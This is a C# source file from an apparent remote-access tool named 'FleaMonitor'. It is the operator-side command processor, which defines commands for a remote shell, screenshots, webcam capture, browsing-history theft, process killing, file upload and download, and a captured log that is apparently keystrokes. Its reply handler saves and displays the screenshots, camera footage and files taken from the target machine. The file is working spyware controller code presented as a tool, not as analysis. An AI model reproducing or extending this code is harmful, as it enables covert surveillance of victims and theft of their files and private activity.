using FleaMonitor.Dialog;
using FleaMonitor.Model;
using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Media.Imaging;

namespace FleaMonitor.Auxiliary
{
    public class CommandProcessor
    {
        public const string VERSION_COMMAND = "version";
        public const string BASH_COMMAND = "bash";
        public const string FTPSCREENSHOT_COMMAND = "ftpscreenshot";
        public const string SCREENSHOT_COMMAND = "screenshot";
        public const string LOG_COMMAND = "log";
        public const string PROCLIST_COMMAND = "proclist";
        public const string KILL_COMMAND = "kill";
        public const string UPLOAD_COMMAND = "upload";
        public const string DIR_COMMAND = "dir";
        public const string GETFILE_COMMAND = "getfile";
        public const string CD_COMMAND = "cd";
        public const string GET_WORKING_DIR_COMMAND = "pwd";
        public const string QUIT_COMMAND = "quit";
        public const string SET_FTP_COMMAND = "setftp";
        public const string BROWSING_HISTORY_COMMAND = "history";
        public const string GET_SYSTEM_INFO_COMMAND = "sysinfo";
        public const string GET_CAMERA_CAPTURE_COMMAND = "camera";

        private static readonly string SCREENSHOT_FILENAME = "screenshot.png";
        private static readonly string BROWSING_HISTORY_FILENAME = "browsing_history.txt";

        public static string? WorkingPath { get; private set; }
        public static string? LastCleanedLog { get; set; } = string.Empty;

        static CommandProcessor() => WorkingPath = GetAssemblyPath();

        public static string CreateXML(string command, string value)
        {
            return $"<Command name='{command}' value='{value}'></Command>";
        }

        /// <summary>
        /// Gets a path of the assembly
        /// </summary>
        /// <returns>A path where the assembly is located in</returns>
        private static string? GetAssemblyPath()
        {
            string codeBase = Assembly.GetExecutingAssembly().Location;
            var uri = new UriBuilder(codeBase);
            string path = Uri.UnescapeDataString(uri.Path);
            return Path.GetDirectoryName(path);
        }

        /// <summary>
        /// Saves byte array to file
        /// </summary>
        /// <param name="buffer">Byte array to save</param>
        /// <param name="fileName">Filename</param>
        private static void SaveByteArrayToFile(byte[] buffer, string fileName)
        {
            if(WorkingPath is null)
            {
                throw new FileNotFoundException("Couldn't get assembly path!");
            }

            var absolutePath = Path.Combine(WorkingPath, fileName);

            using FileStream fs = new(absolutePath, FileMode.Create);
            fs.Write(buffer, 0, buffer.Length);
        }

        private static void ShowScreenshot(string fileName)
        {
            if (WorkingPath is null)
            {
                throw new FileNotFoundException("Couldn't get assembly path!");
            }

            var absolutePath = Path.Combine(WorkingPath, fileName);
            var imageWindow = new ImageWindow();
            imageWindow.Owner = Application.Current.MainWindow;
            imageWindow.imageViewer.Source = new BitmapImage(new Uri(absolutePath));
            imageWindow.Show();
        }
        
        private static void PlayWMVFile(string fileName)
        {
            if (WorkingPath is null)
            {
                throw new FileNotFoundException("Couldn't get assembly path!");
            }

            var absolutePath = Path.Combine(WorkingPath, fileName);
            var playWindow = new PlayMovieWindow();
            playWindow.Owner = Application.Current.MainWindow;
            playWindow.mediaElement.Source = new Uri(absolutePath);
            playWindow.Show();
        }

        /// <summary>
        /// Process returned data
        /// </summary>
        /// <param name="command">Command that was sent to server</param>
        /// <param name="value">Additional parameter to the command</param>
        /// <param name="buffer">A response from the server as the array of bytes</param>
        /// <param name="fleaInfo">FleaInfo object to write log</param>
        public static void ProcessReply(string command, string value, byte[] buffer, FleaInfo fleaInfo)
        {
            if(buffer.Length == 0)
            {
                return;
            }

            switch (command)
            {
                case SCREENSHOT_COMMAND:
                    SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), SCREENSHOT_FILENAME);
                    fleaInfo.Txt = "Screenshot saved.\n";
                    ShowScreenshot(SCREENSHOT_FILENAME);
                    break;

                case GETFILE_COMMAND:
                    SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), value);
                    fleaInfo.Txt = $"File {value} saved.\n";
                    break;

                case GET_CAMERA_CAPTURE_COMMAND:
                    if(buffer.Length < 256)
                    {
                        fleaInfo.Txt = "Camera capture probably failed.\n";
                        break;
                    }

                    SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), value);
                    fleaInfo.Txt = "Camera capture saved.\n";
                    
                    if(value.ToLower().IndexOf(".wmv") != -1)
                    {
                        PlayWMVFile(value);
                    }
                    else
                    {
                        ShowScreenshot(value);
                    }
                    break;
                    
                case BROWSING_HISTORY_COMMAND:
                    SaveByteArrayToFile(buffer, BROWSING_HISTORY_FILENAME);
                    fleaInfo.Txt = $"File {BROWSING_HISTORY_FILENAME} saved.\n";
                    break;

                case LOG_COMMAND:
                    LastCleanedLog = Helper.CleanLog(Encoding.UTF8.GetString(buffer));
                    break;
            }
        }
    }
}
